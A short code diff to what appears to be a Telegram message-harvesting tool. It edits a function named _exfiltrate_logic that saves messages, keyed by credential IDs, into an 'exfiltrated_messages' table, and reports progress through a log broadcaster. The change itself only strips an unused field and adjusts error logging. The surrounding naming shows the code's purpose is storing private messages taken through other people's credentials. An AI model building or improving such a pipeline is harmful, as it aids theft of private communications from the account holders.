@@ -87,21 +87,25 @@ async def _exfiltrate_logic(cred_id: str):
     new_count = 0
     for msg in messages:
         msg["credential_id"] = cred_id
+        
+        # SANITIZE: Remove keys that don't exist in the 'exfiltrated_messages' table
+        # ScraperService adds 'chat_id' for context, but DB doesn't have it.
+        db_payload = msg.copy()
+        if "chat_id" in db_payload:
+            del db_payload["chat_id"]
+            
         try:
             # Use upsert: insert if not exists, ignore if duplicate
-            # The unique constraint is on (credential_id, telegram_msg_id)
             result = db.table("exfiltrated_messages").upsert(
-                msg,
+                db_payload,
                 on_conflict="credential_id,telegram_msg_id",  # Conflict columns
                 ignore_duplicates=True  # Don't update existing, just skip
             ).execute()
             
-            # Check if a new row was inserted (result.data will have the row)
             if result.data:
                 new_count += 1
         except Exception as e:
-            # Log but continue - might be a different error
-            print(f"    ⚠️ Insert error for msg {msg.get('telegram_msg_id')}: {e}")
+            logger.error(f"    ❌ Insert error for msg {msg.get('telegram_msg_id')}: {e}")
 
     if new_count > 0:
         await broadcaster.send_log(f"💾 Saved {new_count} new messages to DB.")
